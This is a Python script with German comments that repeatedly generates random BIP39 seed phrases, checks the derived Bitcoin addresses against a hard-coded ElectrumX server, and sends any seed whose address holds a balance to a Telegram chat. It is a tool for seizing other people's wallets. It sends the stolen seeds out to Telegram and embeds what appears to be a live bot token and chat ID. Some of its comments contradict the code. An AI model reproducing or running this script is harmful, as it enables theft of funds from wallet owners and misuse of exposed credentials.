import os
import asyncio
import aiohttp
import logging
import multiprocessing
from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes, Bip39WordsNum
from aiogram import Bot

# Logger-Konfiguration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Telegram-Token und Chat-ID direkt im Code definieren
TELEGRAM_TOKEN = "7706620947:AAGLGdTIKi4dB3irOtVmHD57f1Xxa8-ZIcs"
CHAT_ID = "1596333326"
ELECTRUMX_SERVER_URL = "http://85.215.178.149:50002"  # Beispiel-URL für ElectrumX-Server

bot = Bot(token=TELEGRAM_TOKEN)

# Funktion zum Benachrichtigen über Telegram
async def notify_telegram(seed, btc_address, btc_balance):
    message = (
        f"⚠️ Wallet mit Balance gefunden!\n\n"
        f"Seed: {seed}\n"
        f"Adresse: {btc_address}\n"
        f"Balance: {btc_balance} BTC"
    )
    await bot.send_message(CHAT_ID, message)

# Generiere ein zufälliges BIP39-Mnemonic
def generate_bip39_seed():
    return Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_12)

# Berechne die BTC-Adresse aus einem BIP39 Seed
def bip44_btc_address_from_seed(seed_phrase):
    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()
    bip44_mst_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
    bip44_acc_ctx = bip44_mst_ctx.Purpose().Coin().Account(0)
    bip44_chg_ctx = bip44_acc_ctx.Change(Bip44Changes.CHAIN_EXT)
    bip44_addr_ctx = bip44_chg_ctx.AddressIndex(0)
    return bip44_addr_ctx.PublicKey().ToAddress()

# Funktion zum Abrufen der BTC-Balance unter Verwendung eines ElectrumX-Servers
async def check_btc_balance(address, retries=3, delay=2):
    for attempt in range(retries):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{ELECTRUMX_SERVER_URL}/address/{address}", timeout=10) as response:
                    data = await response.json()
                    balance = data.get("confirmed", 0) / 100000000  # Satoshi zu BTC
                    return balance
        except asyncio.TimeoutError:
            logging.warning(f"Timeout bei Versuch {attempt + 1} für Adresse {address}")
            await asyncio.sleep(delay)  # Warten und dann erneut versuchen
        except Exception as e:
            logging.error(f"Fehler beim Abrufen der Balance für {address}: {str(e)}")
            break  # Bei anderen Fehlern abbrechen
    logging.error(f"Fehler bei allen Versuchen, die Balance für {address} abzurufen.")
    return 0  # Rückgabe 0, wenn die Adresse nicht abgefragt werden konnte

# Asynchrone Funktion zur Verarbeitung eines einzelnen Wallets
async def process_wallet_async(seed):
    btc_address = bip44_btc_address_from_seed(seed)
    btc_balance = await check_btc_balance(btc_address)
    if btc_balance > 0:
        logging.info(f"Wallet mit Balance gefunden: {btc_address} - Balance: {btc_balance} BTC")
        await notify_telegram(seed, btc_address, btc_balance)
    else:
        logging.info(f"Wallet ohne Balance: {btc_address}")

# Asynchrone Funktion zur Verarbeitung eines gesamten Wallet-Batches
async def process_wallets_batch(seeds):
    tasks = [process_wallet_async(seed) for seed in seeds]
    await asyncio.gather(*tasks)

# Funktion zur parallelen Verarbeitung der Wallets mit Multiprocessing
def process_wallets_multiprocessing(seeds):
    asyncio.run(process_wallets_batch(seeds))

# Hauptfunktion zum Erstellen von Wallets und deren Verarbeitung
async def main():
    while True:  # Endlosschleife für kontinuierliches Arbeiten
        seeds = [generate_bip39_seed() for _ in range(100)]  # 250 Seeds pro Zyklus
        logging.info(f"Verarbeite {len(seeds)} Wallets...")
        # Verarbeite die Seeds in mehreren Prozessen parallel
        with multiprocessing.Pool(processes=4) as pool:  # Nutze eine angepasste Anzahl an Prozessen
            pool.map(process_wallets_multiprocessing, [seeds[i:i+250] for i in range(0, len(seeds), 250)])

# Das Skript starten
if __name__ == "__main__":
    asyncio.run(main())
